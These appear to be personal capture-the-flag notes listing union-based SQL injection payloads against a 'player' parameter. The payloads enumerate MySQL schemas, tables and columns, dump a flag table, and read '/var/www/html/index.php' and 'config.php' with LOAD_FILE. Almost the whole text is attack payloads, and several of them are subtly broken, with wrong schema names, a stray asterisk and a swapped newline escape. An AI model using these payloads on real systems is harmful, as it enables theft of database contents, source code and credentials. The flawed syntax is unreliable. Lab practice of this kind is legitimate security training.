# Resources
[MYSQL Documentation](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html)

# Injection
### Table Getting
Gets the amount of columns
`player=Tim' union select * 1,1,1,1 -- -

Get the Row name of the table
`player=Tim' union select schema_name from information.schema.schemata -- -`

This will get all the different rows and put them on on line separated by a comma
`player=Tim' union select group_concat(schema_name) from information_schema.schemata -- -`

This will give the column and the Row information
`player=Tim' union select group_concat(TABLE_NAME, ":", COLUMN_NAME, "\n") from information_schema.columns where TABLE_SCHEMA like 'table we want' -- -`

This will return the player and the tables of the player names
`player=Tim' union select group_concat(player, "n\") from table.players -- -`

* the results being Flag:one and players:player

`player=Tim' union select group_concat(one, "n\") from november.flag -- -`

`player=Tim' union select information_schema.schemata -- -`




### Useful table to attack

`player=Tim' union select LOAD_FILE('/var/www/html/index.php') -- -`
`player=Tim' union select LOAD_FILE('/var/www/html/config.php') -- -`
# Basic command
This is concatenate what is on the rows for the table onto one row
`group_concat(schema_name)`